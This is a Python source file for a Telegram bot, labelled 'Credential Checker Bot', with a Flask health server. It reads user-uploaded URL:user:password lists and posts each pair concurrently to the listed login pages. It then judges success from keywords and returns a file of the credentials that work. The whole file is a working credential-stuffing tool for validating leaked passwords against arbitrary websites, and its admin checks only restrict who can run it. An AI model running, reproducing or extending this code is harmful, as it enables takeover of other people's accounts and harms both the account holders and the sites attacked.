import os
import sys
import logging
import threading
import aiohttp
import asyncio

# Fix for Pyrogram on Python 3.14+
try:
    asyncio.get_event_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

from flask import Flask
from pyrogram import Client, filters, enums
from pyrogram.types import Message, InputMediaDocument
from config import API_ID, API_HASH, BOT_TOKEN, ADMINS

# --- Configuration ---
# ADMINS is a string of comma-separated user IDs in config.py
ALLOWED_USERS = []
if ADMINS:
    ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]

# Logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Security Middleware ---
def is_admin(user_id):
    if not ALLOWED_USERS:
        return False # If no admins defined, deny all (safety first)
    return user_id in ALLOWED_USERS

# --- Flask Health Server (Keep Alive) ---
flask_app = Flask(__name__)

@flask_app.route("/")
def health_check():
    return "Bot is running and healthy.", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    logger.info(f"Starting Flask health server on port {port}")
    flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)

# --- Credential Checking Logic ---
async def check_credential(session, url, user, password):
    try:
        payload = {
            "email": user,
            "username": user,
            "user": user,
            "login": user,
            "password": password
        }
        async with session.post(url, data=payload, allow_redirects=False, timeout=10) as response:
            text = ""
            try:
                text = (await response.text()).lower()
            except:
                pass
            
            status = response.status
            
            # Heuristic detection
            fail_terms = ["invalid", "incorrect", "failed", "error", "wrong", "unauthorized", "forbidden", "captcha", "verification"]
            success_terms = ["welcome", "dashboard", "success", "token", "session", "logout", "account", "profile", "home"]
            
            has_fail = any(term in text for term in fail_terms)
            has_success = any(term in text for term in success_terms)
            
            if has_fail:
                return False
            if has_success:
                return True
            if status in [301, 302, 303]:
                return False # Ambiguous redirect, treat as fail for safety
            
            return False
    except Exception:
        return False

async def process_credentials(client, message, file_path):
    chat_id = message.chat.id
    valid_results = []
    
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
    except Exception as e:
        await message.reply_text(f"❌ Error reading file: {str(e)}")
        return

    total_lines = len(lines)
    if total_lines == 0:
        await message.reply_text("❌ The file is empty.")
        return

    progress_msg = await message.reply_text(
        f"⚙️ **Process Started**\n\nTotal lines: {total_lines}\n\nI will send progress updates every 10%."
    )

    semaphore = asyncio.Semaphore(20) # Limit concurrency

    async def bounded_check(session, url, user, password):
        async with semaphore:
            return await check_credential(session, url, user, password)

    async with aiohttp.ClientSession() as session:
        tasks = []
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            # Parse URL:user:pass
            parts = line.split(':')
            if len(parts) < 3:
                continue
            password = parts[-1]
            user = parts[-2]
            url = ":".join(parts[:-2])
            if not url.startswith('http://') and not url.startswith('https://'):
                url = 'https://' + url
            
            tasks.append((url, user, password, bounded_check(session, url, user, password)))

        processed = 0
        valid_count = 0
        batch_size = max(1, int(total_lines * 0.1))

        for url, user, passw, task in tasks:
            try:
                is_valid = await task
                if is_valid:
                    valid_results.append(f"{url}:{user}:{passw}")
                    valid_count += 1
            except Exception as e:
                logger.error(f"Task failed: {e}")
            
            processed += 1
            if processed % batch_size == 0 or processed == total_lines:
                percent = int((processed / total_lines) * 100)
                try:
                    await progress_msg.edit_text(
                        f"⏳ **Progress Update**\n\nChecked: {processed}/{total_lines}\nProgress: {percent}%\nValid Found: {valid_count}\n\n*Please wait until complete.*"
                    )
                except:
                    pass

    if valid_results:
        filename = "valid_credentials.txt"
        with open(filename, 'w') as f:
            f.write("\n".join(valid_results))
        
        try:
            await client.send_document(
                chat_id=chat_id,
                document=filename,
                caption=f"✅ **Process Complete!**\n\n"
                        f"📊 **Summary:**\n"
                        f"- Total Checked: {processed}\n"
                        f"- **Valid Found: {valid_count}**\n"
                        f"- Invalid/Skipped: {processed - valid_count}\n\n"
                        f"📄 Download the file below.",
            )
        except Exception as e:
            await message.reply_text(f"❌ Failed to send result file: {str(e)}")
        finally:
            if os.path.exists(filename):
                os.remove(filename)
    else:
        await message.reply_text(f"🛑 **Process Complete**\n\nNo valid credentials found.")

    if os.path.exists(file_path):
        os.remove(file_path)

# --- Bot Handlers ---
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command("start"))
async def start_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return

    await message.reply_text(
        "👨‍💻 **Credential Checker Bot**\n\n"
        "I can validate credentials from a text file.\n\n"
        "**Format:**\n"
        "URL:email:password or URL:username:password\n\n"
        "**How to use:**\n"
        "1. Send a `.txt` file with your list.\n"
        "2. I will check each line and return a new file with ONLY valid credentials.\n\n"
        "⚠️ **Note:**\n"
        "- Progress updates are sent every 10%.\n"
        "- Do not send multiple files at once."
    )

@app.on_message(filters.document)
async def handle_document(client, message: Message):
    if not is_admin(message.from_user.id):
        return # Silent ignore for non-admins
    
    file_name = message.document.file_name
    if not file_name.endswith('.txt'):
        await message.reply_text("❌ Invalid file type. Please send a `.txt` file only.")
        return
    
    try:
        file_path = await message.download()
    except Exception as e:
        await message.reply_text(f"❌ Failed to download file: {str(e)}")
        return
    
    await message.reply_text("📥 File received. Starting validation process...")
    
    # Start processing in a separate task
    asyncio.create_task(process_credentials(client, message, file_path))

@app.on_message(filters.private)
async def private_handler(client, message: Message):
    if not is_admin(message.from_user.id):
        return # Silent ignore
    await message.reply_text("⚠️ **Access Denied**. Only authorized administrators can use this bot.")

# --- Main Execution ---
if __name__ == "__main__":
    # Start Flask in a separate daemon thread
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    logger.info("Flask health server started.")
    logger.info("Starting Pyrogram Client...")
    
    # Run the bot
    app.run()
